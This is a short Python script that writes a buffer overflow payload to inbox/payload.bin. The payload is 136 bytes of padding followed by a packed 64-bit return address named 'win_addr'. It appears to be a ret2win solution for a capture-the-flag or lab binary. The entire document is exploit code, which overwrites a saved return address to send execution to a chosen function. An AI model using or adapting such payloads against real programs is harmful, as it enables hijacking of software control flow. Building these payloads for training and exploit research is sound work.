from pathlib import Path
import struct

offset = 136
win_addr = 0x4012d6

payload = b"A" * offset

payload += struct.pack("<Q", win_addr)

Path("inbox/payload.bin").write_bytes(payload)

print("Output payload to inbox/payload.bin")
